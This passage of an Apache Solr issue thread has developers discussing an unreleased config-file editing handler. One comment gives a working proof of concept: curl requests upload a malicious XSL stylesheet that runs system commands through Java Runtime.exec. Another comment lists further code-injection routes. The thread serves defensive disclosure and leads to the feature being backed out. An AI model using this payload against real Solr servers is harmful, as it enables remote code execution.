            "content": "\"ShowFileRequestHandler\".\n\n+1 - bad name if it can now write.\n\nWe should also do some validation on the uploaded file. Try to load the byte array as an xml file - if it's not what we expect, don't write it to the filesystem or zk. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13835900",
            "date": "2013-11-30T23:41:13+0000",
            "content": "bq: \"ShowFileRequestHandler\".\n\nYeah, I though about how confusing that was too. But did I do it when I was thinking about it? Noooooo.\n\nMark Miller\nbq: We should also do some validation on the uploaded file.\n\nWe don't have the button in the UI yet, but there's a \"test\" capability that creates and tries to load a temporary core, it never tries to write either to the local conf directory or ZK; it uses a temp dir. Does that serve? It'll barf in all cases where the XML for schema and config is just flat mal-formed. Hmmmm, validating anything with an xml extension would be cheap enough to do whether the user pressed the test button or not, wouldn't it... Good idea.\n\nOK, it seems like it would be acceptable to move writing to something more appropriately named and allow the security concerns to be governed by whether people un-comment the new handler and/or set it up with passwords etc. I'll open up a JIRA and see what I can whip up so we can figure out what to do next as in whether to revert or not. Of course I'd like to not throw away the work, but that happens now and again. "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13836061",
            "date": "2013-12-01T16:42:49+0000",
            "content": "Hi,\nFYI I created a proof of concept why enabling this by default is bad:\n\nFirst, after reading the blog post, you might think, you need to actually POST to the handler, which is not possible via XXE. But as Solr allows to pass a content stream through the URL query as string, your system is wide open for writing files, also when you can only do GET requests. Here is the example that uploads the file from the above blog post as xslt/test.xsl. This file has Java code embedded that starts calc.exe on windows systems:\n\n> curl 'http://localhost:8983/solr/collection1/admin/file?file=xslt/test.xsl&contentType=text/xml;charset=utf-8&op=write&stream.body=%3Cxsl%3Astylesheet%20version%3D%221.0%22%0A%20%20%20%20xmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%0A%20%20%20%20xmlns%3Art%3D%22http%3A%2F%2Fxml.apache.org%2Fxalan%2Fjava%2Fjava.lang.Runtime%22%3E%0A%0A%20%20%3Cxsl%3Aoutput%20method%3D%22text%22%2F%3E%0A%0A%20%20%3Cxsl%3Atemplate%20match%3D%22%2F%22%3E%0A%20%20%20%3Cxsl%3Avariable%20name%3D%22cmd%22%3E%3C!%5BCDATA%5Bcalc.exe%5D%5D%3E%3C%2Fxsl%3Avariable%3E%0A%20%20%20%3Cxsl%3Avariable%20name%3D%22rtObj%22%20select%3D%22rt%3AgetRuntime()%22%2F%3E%0A%20%20%20%3Cxsl%3Avariable%20name%3D%22process%22%20select%3D%22rt%3Aexec(%24rtObj%2C%20%24cmd)%22%2F%3E%0A%20%20%20%3Cxsl%3Atext%3EProcess%20started%3A%20%3C%2Fxsl%3Atext%3E%3Cxsl%3Avalue-of%20select%3D%22%24process%22%2F%3E%0A%20%20%3C%2Fxsl%3Atemplate%3E%0A%3C%2Fxsl%3Astylesheet%3E'\n\n\n\nThis is the file uploaded by this (on my windows system that open the windows calculator calc.exe, modify for linux or use other windows commands to format your harddisk):\n\n\n<xsl:stylesheet version=\"1.0\"\n    xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"\n    xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\">\n\n  <xsl:output method=\"text\"/>\n\n  <xsl:template match=\"/\">\n   <xsl:variable name=\"cmd\"><![CDATA[calc.exe]]></xsl:variable>\n   <xsl:variable name=\"rtObj\" select=\"rt:getRuntime()\"/>\n   <xsl:variable name=\"process\" select=\"rt:exec($rtObj, $cmd)\"/>\n   <xsl:text>Process started: </xsl:text><xsl:value-of select=\"$process\"/>\n  </xsl:template>\n</xsl:stylesheet>\n\n\n\nIf you want to edit the file and create the correctly encoded stream.body URL param, you can use this tool: http://meyerweb.com/eric/tools/dencoder/\n\nIf you then execute the newly created XSL file in your xslt config directory, the windows calculator opens on your desktop \u2013 booom!:\n\n\n> curl 'http://localhost:8983/solr/select/?q=*:*&wt=xslt&tr=test.xsl'\nProcess started: java.lang.ProcessImpl@73e71ddf\n\n\n\nThis is the reason, why this must be disabled by default. Having the possibility to upload arbitrary files containing active content to the solr server with only a GET (!!!!) cannot be done by default. GET requests can be started by even smallest leaks in your firewall (as explained in the blog above). "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13836068",
            "date": "2013-12-01T16:59:01+0000",
            "content": "You can also upload a whole shell script to your config dir with a single GET request using stream.body and then execute this one with the above XSL. There are no limit, you can do whatever you like \n\nIn addition the XSL hack used here is not the only possibility to use the new \"solr file manager\" to inject code:\n\n\tYou can use the file manager to upload javascript files into the DIH folder and execute it later through DIH\n\tYou can use the file manager to upload javascript files to the config dir and then use them in the UpdateRequestHandler through ScriptUpdateProcessor. This is not enabled by default, but you can also upload a new solrconfig.xml through this handler and enable this, even with a GET request!!!\n\n\n\nAs Javascript (or any other scripting language) is running in Solr's JVM, you have access to the whole Solr API from the viewpoint of the Solr Update Request Handler / DIH.\n\nThe above PoC just shows the easiest way to use this hole. "
        },
        {
            "author": "David Jorm",
            "id": "comment-13836170",
            "date": "2013-12-02T01:16:06+0000",
            "content": "Sorry for weighing in on this late in the game. I am the security response lead for Red Hat Java middleware products, some of which include Apache Solr. I agree with the points Uwe has made regarding this feature constituting a serious security vulnerability. From my testing it appears that this commit is not incorporated into the Solr 4.6.0 release, so if we back the commit out of 4.7.0, then it will have never been released. Is that correct? If so, I think we can avoid the need to assign a CVE ID to this issue.\n\nPowerful web-based admin capabilities such as this are always dangerous from a security perspective. At a minimum, authentication and authorization with no default credentials should be applied (i.e. an admin has to manually add a user, and they're aware of the security implications of doing so). "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13836368",
            "date": "2013-12-02T08:38:42+0000",
            "content": "Hi David Jorm,\nThank you for the comment. You are right, this is not part of Solr 4.6.0, otherwise I would not have made the POC public on this issue tracker. So a CVE is not needed.\n\nI agree with you, too, that powerful admin features that allow deeper modifications to the hosting system, need to be secured. So although there is already SOLR-5518 that wants to move this feature to a separate RequestHandler, I don't want to have that in the stable branch. Please back it out completely for 4.x.\n\nI am fine with letting it bake on the trunk branch and we should spend some efforts to make \"RequestHandler\" based security features available. It should be easily possible to add those security features, because RequestHandlers are encapsulated. We can use the abstract Java features of java.lang.security.Principal to manage users on an abstract way (and fall back to servlet container). We then just need to check the principal on the ServletRequest and decide if the RequestHandler is executed and return HTTP Fobidden otherwise. Yu can then configure users and so on, on the servlet container. If you don't do, all the advanced admin features are disabled.\n\nThe following features should be inaccessible by default:\n\n\tadmin request handlers, especially stuff like creating cores, deleting indexes,...\n\tscripted updates (currently disabled by default)\n\tscripted DIH (needs access to filesystem to enable)\n\n\n\nWe should investigate this in Solr 5 (aka trunk) and not hurry in backporting those features. I am happy to help. "
        },
        {
            "author": "Steve Rowe",
            "id": "comment-13836586",
            "date": "2013-12-02T15:06:50+0000",
            "content": "\nBTW, I take it this doesn't apply to the REST API for manipulating the schema?\nIt should not apply, because this does not support uploading arbitrary files or modifying plain XML that can get exploited with xinclude/external entities. The schema modification APIs hopefully only allow \"semantic changes\" to the schema, but does not allow to upload XML snippets to be included in those files without checks. I think Steve Rowe can comment on this, thanks for the pointer!\n\nAt present, only JSON is supported in the Schema REST API methods that accept PUT or POST requests, so xinclude/external entities aren't possible.  External files can be pointed to, though, for classes that use them, e.g. analysis components. "
        },
        {
            "author": "Yonik Seeley",
            "id": "comment-13836635",
            "date": "2013-12-02T16:05:38+0000",
            "content": "It feels like multiple issues are being mixed together here.\nThere is the high level feature of being able to edit solrconfig/schema from the admin screen, which I don't see any issues with.\nIt's the implementation of that feature in this issue that has exploits it should not have? "
        },
        {
            "author": "Uwe Schindler",
            "id": "comment-13836696",
            "date": "2013-12-02T17:15:27+0000",
            "content": "The commit in this issue is the problematic one. The other issues to be reverted are just \"usage\" of this new API in the admin interface. If we remove that feature from the 4.x branch, we have to remove the admin screens for it, too.\n\nSteve Rowe's answer was just for Erick Erickson and me, because we wanted to confirm that the schema editing API does not have some \"file manager\" functionality, so you can inject code into solr's config or templates or whatever. "
        },
        {
            "author": "Mark Miller",
            "id": "comment-13836802",
            "date": "2013-12-02T19:10:21+0000",
            "content": "It's the implementation of that feature in this issue that has exploits it should not have?\n\nYes. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13837297",
            "date": "2013-12-03T03:47:08+0000",
            "content": "Pulled out of 4.x, and put in its own handler for 5.0 "
        },
        {
            "author": "Alexandre Rafalovitch",
            "id": "comment-13959896",
            "date": "2014-04-04T11:57:32+0000",
            "content": "I know this one is closed, but it's tagged with 4.7. This should probably be changed to avoid future confusion. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13959933",
            "date": "2014-04-04T13:15:00+0000",
            "content": "Opening long enough to remove 4.7 tag since it's misleading. "
        },
        {
            "author": "Erick Erickson",
            "id": "comment-13959935",
            "date": "2014-04-04T13:16:16+0000",
            "content": "took out references to 4.7 "
        },
        {
            "author": "ASF subversion and git services",
            "id": "comment-14268832",
            "date": "2015-01-08T05:15:48+0000",
            "content": "Commit 1650208 from Erick Erickson in branch 'dev/trunk'\n[ https://svn.apache.org/r1650208 ]\n\nSOLR-6925: Back out changes having to do with SOLR-5287 (editing configs from admin UI) "
        },
        {
            "author": "ASF subversion and git services",
            "id": "comment-14268902",
            "date": "2015-01-08T06:42:17+0000",
            "content": "Commit 1650213 from Erick Erickson in branch 'dev/branches/branch_5x'\n[ https://svn.apache.org/r1650213 ]\n\nSOLR-6925: Back out changes having to do with SOLR-5287 (editing configs from admin UI) "
        },
        {
            "author": "ASF subversion and git services",
            "id": "comment-14272344",
            "date": "2015-01-10T05:09:26+0000",
            "content": "Commit 1650720 from Erick Erickson in branch 'dev/trunk'\n[ https://svn.apache.org/r1650720 ]\n\nno separate JIRA, just updating some obsolete JIRAs related to ripping out SOLR-5287 "
        },
        {
            "author": "ASF subversion and git services",
            "id": "comment-14272345",
            "date": "2015-01-10T05:10:43+0000",
            "content": "Commit 1650721 from Erick Erickson in branch 'dev/branches/branch_5x'\n[ https://svn.apache.org/r1650721 ]\n\nno separate JIRA, just updating some obsolete JIRAs related to ripping out SOLR-5287 "
        },
        {
            "author": "Anshum Gupta",
            "id": "comment-14332986",
            "date": "2015-02-23T05:02:57+0000",
            "content": "Bulk close after 5.0 release. "
        }
    ]
}